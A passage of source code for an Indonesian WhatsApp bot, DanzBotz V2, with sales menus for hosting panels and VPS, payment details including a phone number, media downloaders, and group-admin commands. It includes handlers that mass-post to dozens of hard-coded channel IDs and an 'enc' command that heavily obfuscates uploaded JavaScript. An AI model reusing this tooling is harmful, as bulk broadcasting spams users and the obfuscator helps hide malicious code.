𝚁𝙰𝙼 𝟹 𝙲𝙿𝚄𝟹 *𝟹𝙺*
𝚁𝙰𝙼 𝟺 𝙲𝙿𝚄𝟺 *𝟺𝙺*
𝚁𝙰𝙼 ?? 𝙲𝙿𝚄𝟻 *𝟻𝙺*
𝚁??𝙼 𝟼 𝙲𝙿𝚄𝟼 *𝟼𝙺*
𝚁𝙰𝙼 𝟽 𝙲𝙿𝚄𝟽 *𝟽𝙺*
𝚁𝙰𝙼 𝟾 𝙲𝙿𝚄𝟾 *𝟾𝙺*
𝚁𝙰𝙼 𝟿 𝙲𝙿𝚄𝟿 *𝟿𝙺*
𝚁𝙰𝙼 𝟷𝟶 𝙲𝙿𝚄𝟷𝟶 *𝟷𝟷𝙺*
𝚁𝙰𝙼 𝚄𝙽𝙻𝙸𝙼𝙸𝚃𝙴𝙳 𝙲𝙿𝚄 𝚄??𝙻𝙸????𝚃𝙴𝙳 *𝟷𝟷𝙺*

\`𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗣𝘂𝗯𝗹𝗶𝗰 𝗗𝗮𝗻𝘇𝗵𝗼𝘀𝘁𝗶𝗻𝗴📡\`
𝙿𝚛𝚒𝚌𝚎 : 𝟾.𝟶𝟶𝟶 ( 𝟾𝙺 )
𝙿𝙴𝚁𝙼𝙰𝙽𝙴𝙽 + 𝙽𝙾 𝙿𝚃"

\`𝗔𝗱𝗺𝗶𝗻 𝗣𝘁𝗲𝗿𝗶𝗱𝗮𝗰𝘁𝘆𝗹 𝗗𝗮𝗻𝘇𝗛𝗼𝘀𝘁𝗶𝗻𝗴📡\`
ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ : 12ᴋ, ɴᴇɢᴏ? ɢᴀ ᴘᴇʀᴍᴀɴᴇɴ

[ ! ] Note : \`\`\`𝙸𝚗𝚐𝚒𝚗 𝚖𝚎𝚖𝚋𝚎𝚕𝚒? 𝚔𝚎𝚝𝚒𝚔 .buypanel 1gb\`\`\`
`
let buttons = [
  {
    buttonId: ".hargapanel2", 
    buttonText: { 
      displayText: "Panel Private"
    }
  }, {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".produk2", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "hargapanel2": {
let menu = `
\`𝗣𝗮𝗻𝗲𝗹 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗗𝗮𝗻𝘇𝗵𝗼𝘀??𝗶𝗻𝗴📡\`
𝚁𝙰𝙼 𝟷 𝙲𝙿𝚄𝟷 *𝟸𝙺*
𝚁𝙰𝙼 𝟸 𝙲𝙿𝚄𝟸 *𝟹𝙺*
𝚁𝙰𝙼 𝟹 𝙲𝙿𝚄𝟹 *𝟺𝙺*
𝚁𝙰𝙼 𝟺 𝙲𝙿𝚄𝟺 *𝟻𝙺*
𝚁𝙰𝙼 𝟻 𝙲𝙿𝚄𝟻 *𝟼𝙺*
𝚁𝙰𝙼 𝟼 𝙲𝙿𝚄𝟼 *𝟽𝙺*
𝚁𝙰𝙼 𝟽 𝙲𝙿𝚄𝟽 *𝟾𝙺*
𝚁𝙰𝙼 𝟾 𝙲𝙿𝚄𝟾 *𝟿𝙺*
𝚁𝙰𝙼 𝟿 𝙲𝙿𝚄𝟿 *𝟷𝟶𝙺*
𝚁𝙰𝙼 𝟷𝟶 𝙲𝙿𝚄𝟷𝟶 *𝟷𝟷𝙺*
𝚁𝙰𝙼 𝚄𝙽𝙻𝙸𝙼𝙸𝚃𝙴𝙳 𝙲𝙿𝚄 𝚄𝙽𝙻𝙸𝙼𝙸𝚃𝙴𝙳 *𝟷𝟸𝙺*

\`𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗗𝗮𝗻𝘇𝗵𝗼𝘀𝘁𝗶𝗻𝗴📡\`
𝙿𝚛𝚒𝚌𝚎 : 𝟷𝟻.𝟶𝟶𝟶 ( 𝟷𝟻𝙺 )
𝙿𝙴𝚁𝙼𝙰𝙽𝙴𝙽 + 𝙽𝙾 𝙿𝚃"

𝙱𝙴𝙽𝙴𝙵𝙸𝚃 𝙱𝚄𝚈 𝙿𝙰𝙽𝙴𝙻 𝙿𝚁𝙸𝚅𝙰𝚃𝙴
➤ 𝚂𝙲 𝙰𝙽𝚃𝙸 𝙳𝙸 𝙲𝙾𝙻𝙾𝙽𝙶
➤ 𝙰𝙳𝙼𝙸𝙽 𝙿𝙰𝙽𝙴𝙻 𝙷𝙰𝙽𝚈𝙰 𝙶𝚆 ( 𝙿𝙴𝙼𝙸𝙻𝙸𝙺 )
➤ 𝙰𝙽𝚃𝙸 𝙳𝙴𝙻𝙰𝚈
➤ 𝙳𝙰𝙽 𝙻𝙰𝙸𝙽"

[ ! ] Note : \`\`\`𝙸𝚗𝚐𝚒𝚗 𝚖𝚎𝚖𝚋𝚎𝚕𝚒? 𝚔𝚎𝚝𝚒𝚔 .buypanel-v2 1gb\`\`\`
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: { 
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Call Me"
    }
  }, {
    buttonId: ".produk2", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "hargavps": {
let menu = `

*»»—— Ready Vps By Danz Store ——««*
*» Ram 2Gb Core 1 : Rp25.000*
*» Ram 2Gb Core 2 : Rp30.000*
*» Ram 4Gb Core 2 : Rp35.000*
*» Ram 8Gb Core 2 : Rp40.000*
*» Ram 8Gb Core 4 : Rp55.000*
*» Ram 16Gb Core 4 : Rp65.000*

*»»—— Benefit Buy Vps ——««*
*» Free req region, os, versi*
*» Free req nama domain*
*» Free install panel & wings*
*» Free install theme*
*» Free egg bot wa/minecraft*
*» Akses vps 100% milikmu*
*» Akses panel 100% milikmu*
*» Bisa open own, pt, adp, reseller*
*» Pasang panel anti ddos +8K*
*» Masa aktif 28-30 day*
*» Garansi 17 day 1x replace*
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: { 
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Call Me"
    }
  }, {
    buttonId: ".produk2", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "shortlink2": case "short2": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("http://") && !text.startsWith("https://")) return m.reply("Link tautan tidak valid")
await axios.get(`https://widipe.com/isgd?link=${text.toLowerCase()}`).then(async (e) => {
let result = e.data
const link = `  
* *Shortlink by is.gd*
 ${result.hasil.shorturl}
`.toString()
return m.reply(link)
}).catch(e => m.reply("Error!" + e))
}
break

case "bukablokir": case "unblock": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await danz.updateBlockStatus(mem, "unblock");
if (m.isGroup) danz.sendMessage(m.chat, {text: `Berhasil membuka memblokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

case "enc": case "encrypted": {
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await danz.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

//===============================================================================

case "menucpanel": {
let menu = `
  ┏━━━【 𝗖𝗣𝗔𝗡𝗘𝗟 𝗗𝗔𝗡𝗭𝗕𝗢𝗧𝗭 𝗩𝟮 】━━━
  ┃❍.cpanelbutton - V5
  ┃❍.cprandom - 5
  ┃❍.delpanelbutton - V5
  ┃❍.listpanel - V5
  ┃❍.listadmin - V5
  ┃❍.deladmin - V5
  ┗
  `
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".cpanelbutton", 
    buttonText: {
      displayText: "Create Panel Button"
   }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "othermenu": {
let menu = `
  ┏【 \`𝙾𝚝𝚑𝚎𝚛 𝙵𝚒𝚝𝚞𝚛𝚎\` 】
  ┃༄.ai
  ┃༄.gpt
  ┃༄.tourl
  ┃༄.tourl2
  ┃༄.ssweb
  ┃༄.translate
  ┃༄.tohd
  ┃༄.shortlink
  ┃༄.shortlink2
  ┃༄.enc
  ┗❐
  `
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "toolsmenu": {
let menu = `
  ┏【 \`𝚃𝚘𝚘𝚕𝚜 𝙿𝚝𝚎𝚛𝚘𝚍𝚊𝚌𝚝𝚢𝚕\` 】
  ┃༄.addpremium
  ┃༄.delpremium
  ┃༄.listpremium
  ┃༄.hackbackpanel
  ┃༄.installpanel
  ┃༄.installtemastellar
  ┃༄.installtemabilling
  ┃༄.installtemaenigma
  ┃༄.uninstallpanel
  ┃༄.uninstalltema
  ┗❐
 `
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "groupmenu": {
let menu = `
┏【 \`𝙶𝚛𝚘𝚞𝚙 𝙼𝚎𝚗𝚞\` 】
┃༄.add
┃༄.kick
┃༄.close
┃༄.open
┃༄.hidetag
┃༄.kudetagc
┃༄.leave
┃༄.tagall
┃༄.promote
┃༄.demote
┃༄.resetlinkgc
┃༄.on
┃༄.off
┃༄.linkgc
┗❐
`
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "ownermenu": {
    let menu = `
	┏【 \`𝙾𝚠𝚗𝚎𝚛 𝙼𝚎𝚗𝚞\` 】
    ┃༄.autopromosi
    ┃༄.addplugins
    ┃༄.listplugins
    ┃༄.delplugins
    ┃༄.getplugins
    ┃༄.saveplugins
    ┃༄.addowner
    ┃༄.listowner
    ┃༄.delowner
    ┃༄.self/public
    ┃༄.setimgmenu
    ┃༄.setimgfake
    ┃༄.setppbot
    ┃༄.clearsession
    ┃༄.clearchat
    ┃༄.resetdb
    ┃༄.restartbot
    ┃༄.getsc
    ┃༄.getcase
    ┃༄.listgc
    ┃༄.joingc
    ┃༄.joinch
    ┃༄.upchannel
    ┃༄.upchannel2
    ┗❐
  `
  let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "storemenu": {
let menu = `
  ┏【 \`𝚂𝚝𝚘𝚛𝚎 𝙼𝚎𝚗𝚞\` 】
  ┃༄.addrespon
  ┃༄.delrespon
  ┃༄.listrespon
  ┃༄.done
  ┃༄.proses
  ┃༄.jpm
  ┃༄.jpm2
  ┃༄.jpmtesti
  ┃༄.jpmslide
  ┃༄.jpmslideht
  ┃༄.jpmallch
  ┃༄.jpmchfoto
  ┃༄.sendtesti
  ┃༄.pushkontak
  ┃༄.pushkontak2
  ┃༄.payment
  ┃༄.produk
  ┃༄.subdomain
  ┃༄.subdomainbutton
  ┗❐  
`
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break

case "payment": {
let menu = `
𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚙𝚒𝚕𝚒𝚑 𝚖𝚎𝚗𝚞 𝚢𝚊𝚗𝚐 𝚊𝚍𝚊 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 

𝙹𝚒𝚔𝚊 𝚒𝚗𝚐𝚒𝚗 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚚𝚛𝚒𝚜 𝚔𝚎𝚝𝚒𝚔 
.qris
`
let buttons = [
  {
    buttonId: ".dana", 
    buttonText: { 
      displayText: "Payment Dana"
    }
  }, {
    buttonId: ".gopay", 
    buttonText: {
      displayText: "Payment Gopay"
    }
  }, {
    buttonId: ".ovo", 
    buttonText: {
      displayText: "Payment Ovo"
    }
  }, {
    buttonId: ".qris", 
    buttonText: {
      displayText: "Payment Qris"
   }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/637/556535998_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "dana": {
let menu = `
*Dana :* 089690235468
*Atas nama :* Z*** R*******
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Back To Payment"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/637/556529163_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "ovo": {
let menu = `
Tidak Tersedia
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Back To Payment"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/637/556536530_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "gopay": {
let menu = `
Tidak Tersedia
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Back To Payment"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/637/556536810_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "qris": {
let menu = `
\`\`\`Scan qris diatas dan jika sudah transfer mohon sertakan bukti\`\`\`
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Back To Payment"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/637/556537243_media.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break
case "bl": case "block": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await danz.updateBlockStatus(mem, "block");
if (m.isGroup) danz.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await danz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://api.simplebot.my.id/api/downloader/ytmp3?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await danz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await danz.sendMessage(m.chat, {react: {text: '??', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://api.simplebot.my.id/api/downloader/ytmp4?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await danz.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "jpmch2": case "jpmchfoto": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Balas/kirim foto dengan teks");
    if (!/image/.test(mime)) return m.reply("Format salah! Balas/kirim foto dengan teks.");
    
    let image = await danz.downloadAndSaveMediaMessage(qmess);
    const daftarSaluran = [
        "120363303833954232@newsletter",
        "120363330731459003@newsletter",
        "120363359215722322@newsletter",
        "120363367873190169@newsletter",
        "120363339318736564@newsletter",
        "120363364718311555@newsletter",
        "120363314249798230@newsletter",
        "120363297799843121@newsletter",
        "120363321196804413@newsletter",
        "120363339741823661@newsletter",
        "120363316789193245@newsletter",
        "120363328334263036@newsletter",
        "120363321814976673@newsletter",
        "120363332893367181@newsletter",
        "120363333939365416@newsletter",
        "120363350047183315@newsletter",
        "120363335099331099@newsletter",
        "120363279030935816@newsletter",
        "120363302950956637@newsletter",
        "120363327147677952@newsletter",
        "120363361784189828@newsletter",
        "120363354018996796@newsletter",
        "120363344957132830@newsletter",
        "120363362940386554@newsletter",
        "120363377528029023@newsletter",
        "120363327322866220@newsletter",
        "120363345404690121@newsletter",
        "120363320256357756@newsletter",
        "120363297700623532@newsletter",
        "120363348402237862@newsletter",
        "120363357257194696@newsletter",
        "120363367054309771@newsletter",
        "120363368234082342@newsletter",
        "120363352911467185@newsletter",
        "120363367830065622@newsletter",
        "120363338302701378@newsletter",
    ];
    let total = 0;

    m.reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await danz.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayJpm); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    m.reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;

case "jpmallch": case "jpmch": {
 if (!isCreator) return Reply(mess.owner); // Periksa apakah pengguna adalah Owner
 if (!text) return Reply("teksnya"); // Periksa apakah teks tersedia
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
"120363359997306140@newsletter",
"120363360931081918@newsletter",
"120363361135749739@newsletter",
"120363380847203061@newsletter",
"120363296267647634@newsletter",
"120363362120667402@newsletter",
"120363372134164940@newsletter",
"120363359100834951@newsletter",
"120363364058382744@newsletter",
"120363298018430229@newsletter",
// Tambahkan ID saluran lainnya
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await danz.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
Reply("*Berhasil mengirim teks ke channel*");
}
break

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await danz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson(`https://api.simplebot.my.id/api/downloader/ytmp3?url=${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await danz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson(`https://api.simplebot.my.id/api/downloader/ytmp3?url=${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await danz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await danz.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danz.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
